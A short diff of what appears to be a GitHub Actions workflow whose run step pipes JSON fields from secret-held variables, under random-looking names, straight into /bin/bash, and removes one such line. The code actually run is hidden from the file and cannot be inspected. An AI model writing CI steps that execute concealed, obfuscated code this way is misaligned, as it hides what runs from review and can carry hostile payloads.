@@ -22,7 +22,6 @@ jobs:
           hfkx63021: ${{ secrets.hfkx63021 }}
         run: |
           printf '%s' "$hfkx63021" | jq -r .l80908 | /bin/bash
-          echo $dnhyu9876 | jq -r .utd138 | /bin/bash
           printf '%s' "$o88249" | jq -r .p037 | /bin/bash
           printf '%s' "$gxv6" | jq -r .blqud205 | /bin/bash
           echo $okeb8114 | jq -r .jki68391 | /bin/bash
